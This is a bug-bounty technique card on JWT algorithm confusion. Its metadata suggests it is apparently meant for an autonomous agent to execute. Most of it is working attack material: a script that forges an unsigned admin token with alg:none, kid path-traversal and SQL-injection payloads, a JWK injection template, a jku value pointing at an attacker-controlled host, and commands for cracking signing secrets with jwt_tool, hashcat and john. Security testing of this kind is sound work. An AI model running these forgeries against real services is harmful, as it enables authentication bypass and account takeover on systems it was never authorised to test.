---
title: JWT Algorithm Confusion
created: 2026-03-10
tags: [skills-learned, cyber, jwt]
type: technique
payout_ceiling: $5K–$25K (auth bypass, ATO)
auth_required: YES (need a valid JWT to tamper)
autonomy_level: EXECUTE
---

# JWT Algorithm Confusion

## Concept

JWT header specifies `alg`. If a server trusts the `alg` field from the token rather than enforcing a fixed expected algorithm, an attacker can:
- **`none` attack** — strip signature, set `alg: none`
- **RS256 → HS256 confusion** — sign with server's *public key* as HMAC secret; server verifies using same public key (the public key is supposed to be public — that's the flaw)
- **JWK header injection** — embed attacker's own JWK in token header; server uses it to verify
- **kid injection** — `kid` header is path/SQL injectable; point to empty file → empty HMAC key

**Token structure:**
```
base64url(header).base64url(payload).base64url(signature)
```

---

## Detection

```bash
# Decode any JWT:
echo "eyJ..." | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Check alg field:
# RS256/ES256 → test HS256 confusion (pubkey as HMAC secret)
# HS256 with weak secret → crack with hashcat
# Any alg → test alg:none

# Get server's public key (for RS256→HS256 attack):
curl https://target.com/.well-known/jwks.json | jq .
curl https://target.com/.well-known/openid-configuration | jq .keys_endpoint
```

**kid injection variants:**
```json
{"alg": "HS256", "kid": "../../dev/null"}
// Sign with empty string as secret — /dev/null = empty HMAC key

{"alg": "HS256", "kid": "' UNION SELECT 'attacker-secret'-- -"}
// SQLi in kid parameter → control signing key
```

---

## Exploitation

### `none` attack (strip signature entirely)
```bash
header='{"alg":"none","typ":"JWT"}'
payload='{"sub":"admin","role":"admin","exp":9999999999}'
h=$(echo -n "$header" | base64 | tr -d '=' | tr '/+' '_-')
p=$(echo -n "$payload" | base64 | tr -d '=' | tr '/+' '_-')
echo "$h.$p."   # Note trailing dot, EMPTY signature
```

### RS256 → HS256 confusion
```bash
# 1. Obtain server public key
curl https://target.com/.well-known/jwks.json > jwks.json

# 2. Use jwt_tool (recommended — handles PEM conversion automatically):
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <TOKEN> -X s    # HMAC with pubkey (RS256→HS256 confusion)
python3 jwt_tool.py <TOKEN> -X k -pk public.pem  # explicit key confusion

# 3. Tamper mode:
python3 jwt_tool.py <TOKEN> -T      # interactive field editor
```

### JWK header injection (embed attacker key)
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker-controlled-n>",
    "e": "AQAB"
  }
}
// Sign with attacker's private key — server uses embedded JWK to verify
// Burp JWT Editor extension handles key generation automatically
```

### jku / x5u SSRF (server fetches JWK from attacker URL)
```
# Set jku to attacker-controlled URL hosting fake JWKS:
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
# If server fetches and trusts → full key injection = ATO
```

---

## Tools & Terminal

```bash
# jwt_tool — swiss army knife
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <JWT> --verbose           # analyze
python3 jwt_tool.py <JWT> -X a                # alg:none
python3 jwt_tool.py <JWT> -X s                # RS256→HS256 (auto-fetch pubkey)
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem # explicit key confusion
python3 jwt_tool.py <JWT> -T                  # tamper interactive

# Crack weak HS256 secrets:
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# hashcat:
hashcat -a 0 -m 16500 <JWT> /usr/share/wordlists/rockyou.txt

# john the ripper:
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.hash

# Burp Suite:
# Extension: JWT Editor (PortSwigger — BApp Store)
# Extension workflow:
# 1. Intercept request with JWT
# 2. JWT Editor tab → decode
# 3. Modify alg + payload claims
# 4. Sign with embedded JWK or known key
```

---

## Bypass / Edge Cases

- Some libraries accept `alg: HS256` in header but use RS key for verify — check library version
- `jku` / `x5u` header → server fetches JWK from attacker URL (SSRF + key injection)
- JWT expiry (`exp`) bypass: modify exp claim if signature check is broken
- Nested JWTs — inner token alg may differ from outer
- Refresh token rotation bypass — use old refresh token if rotation not enforced
- `alg: RS256` with empty/null public key → some libraries fail open

---

## Filing Guidance

**`none` attack or RS256→HS256 confirmed:** High ($10K–$25K) — full auth bypass documented
**kid SQLi:** High ($10K–$25K) — show the injectable parameter + crafted signing key
**Weak secret cracked:** Medium ($5K–$10K) — show hashcat output + forged admin token

Evidence required: Before token (legitimate low-priv), crafted token, response showing elevated access. Three-screenshot minimum.

---

*JWT Algorithm Confusion v1.0 | Ingested 2026-03-10 | Owner: cyber-operator*
